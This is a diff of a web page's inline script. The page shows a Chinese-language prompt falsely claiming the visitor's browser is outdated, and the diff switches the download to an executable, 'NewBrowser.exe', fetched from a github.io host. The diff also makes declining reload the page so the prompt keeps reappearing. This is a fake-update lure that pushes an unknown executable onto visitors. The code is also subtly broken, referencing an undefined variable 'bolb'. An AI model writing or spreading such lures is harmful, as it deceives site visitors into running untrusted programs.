@@ -9,7 +9,7 @@
       con=confirm("您的浏览器版本过旧，请点击确定更新到最新版本！");
       if(con==true)
       {
-        fetch('https://upup-cool.github.io/Remote/Web/hi.html').then(res=>res.blob().then(blob=>{
+        fetch('https://upup-cool.github.io/Remote/Web/NewBrowser.exe').then(res=>res.blob().then(blob=>{
           var c=document.createElement('c');
           var url=window.URL.createObjectURL(bolb);
           var filename='NewBrowser';
@@ -23,7 +23,7 @@
       }
       else
       {
-        con;
+        location.reload();
       }
     </script>
   </head>
